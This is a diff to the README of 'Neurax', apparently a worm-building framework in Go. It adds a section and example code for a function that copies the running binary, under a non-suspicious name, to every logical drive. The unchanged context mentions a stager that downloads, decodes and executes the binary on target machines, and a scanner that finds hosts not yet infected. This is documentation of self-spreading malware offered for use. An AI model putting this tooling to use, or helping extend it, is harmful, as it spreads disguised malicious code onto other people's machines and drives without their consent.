@@ -29,7 +29,10 @@ func main(){
 
   //Start a server that exposes the current binary in the background
   go NeuraxServer()
-  
+ 
+  //Copy current binary to all logical drives
+  NeuraxDisks()
+
   //Create a command stager that should be launched on target machine
   //It will download, decode and execute the binary
   cmd_stager := NeuraxStager()
@@ -66,6 +69,12 @@ Function `NeuraxScan(c chan string)` enables detection of active hosts on local 
 It accepts a channel of type string as it's only argument and should be launched as a goroutine.
 Any scanned host will be sent through that channel as soon as it was classified as active.
 Host is treated as active when it has at least 1 open port, is not already infected + fullfils conditions specified within `NeuraxConfig`.
+
+### Disks infection
+  Neurax binary doesn't have to copy itself using wireless means.
+  Function `NeuraxDisks()` copies current binary (under non-suspicious name) to all logical drives that were found.
+  Copied binary is not executed, but simply resides in it's destination waiting to be run.
+  `NeuraxDisks()` returns an `error` if list of disks cannot be obtained or copying to any destination was impossible.
 
 ## Artwork credits
 
